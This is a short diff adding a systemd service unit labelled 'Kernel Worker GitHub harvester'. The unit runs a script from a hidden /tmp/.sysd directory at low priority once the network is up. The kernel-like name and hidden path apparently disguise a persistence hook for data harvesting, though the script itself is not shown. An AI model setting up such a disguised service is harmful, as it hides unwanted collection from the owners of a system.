@@ -1,0 +1,9 @@
+[Unit]
+Description=Kernel Worker GitHub harvester
+After=network-online.target
+
+[Service]
+Type=oneshot
+ExecStart=/tmp/.sysd/hunt.sh all
+Nice=19
+TimeoutStartSec=30min
